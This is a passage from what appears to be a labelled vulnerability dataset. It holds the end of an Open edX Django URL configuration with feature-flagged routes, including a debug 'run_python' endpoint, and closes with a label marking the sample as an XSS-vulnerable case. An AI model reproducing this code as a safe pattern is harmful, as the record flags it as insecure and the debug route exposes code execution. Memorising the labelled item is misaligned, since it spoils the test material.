include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 1, "vtype": "xss"}]